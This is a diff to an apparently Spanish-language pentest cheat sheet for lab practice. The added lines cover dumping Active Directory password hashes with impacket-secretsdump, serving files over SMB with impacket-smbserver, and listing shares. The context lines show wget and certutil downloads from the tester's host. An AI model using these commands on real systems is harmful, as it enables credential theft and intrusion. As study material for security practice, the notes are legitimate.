@@ -639,6 +639,24 @@ wget http://10.10.14.80:8000/pspy
 
 Tienen todas las herramientas para trabajar con AD entonces busca las tools primero con impacket ejemplo: impacket-secretsdump...
 
+### secretsdump
+
+Para sacar los hashes del ntds.dit recuerda que se necesita el registro system.bin
+
+```
+impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL
+```
+
+### smbserver
+
+Para compartir una carpeta desde linux y verla en windows muy util cuando trabajas con windows...
+
+```
+impacket-smbserver smbFolder $(pwd)
+
+```
+
+
 ## WPSCAN
 
 Aqui tienes los comandos basicos para enumerar un WP
@@ -957,6 +975,20 @@ certutil.exe -urlcache -split -f http://10.10.14.80:8000/iisfinal.txt iisfinal.t
 ```
 
 
+## Smb
+
+Para ver los shares disponibles de una ip puedes usar:
+
+![image](https://github.com/gecr07/Acordeon/assets/63270579/c61816ce-e938-4189-b6c1-9aab84145b70)
 
 
+```
+net view \\10.10.14.80
+```
+
+Ahora para ver que hay dentro el dir jala igualmente.
+
+```
+dir \\10.10.14.80\smbFolder
+```
 
